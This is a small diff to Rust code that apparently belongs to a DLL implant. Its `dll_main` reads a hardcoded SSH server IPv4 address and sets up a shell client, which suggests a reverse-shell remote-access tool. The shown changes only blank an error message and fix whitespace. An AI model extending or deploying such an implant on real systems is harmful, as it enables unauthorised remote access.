@@ -56,7 +56,7 @@ impl Session {
                 _ => {}
             }
         }
-        Ok(code.expect("program did not exit cleanly"))
+        Ok(code.expect(""))
     }
 }
 
@@ -121,7 +121,7 @@ pub async fn dll_main() {
     let config = Arc::new(config);
     let sh = Client {};
     debug_println!("dll_main");
-    
+
     let ssh_server_ip = String::from_utf8_lossy(SSH_CONNECT_IPV4_ADDRESS)
         .to_string()
         .trim_matches(char::from(0))
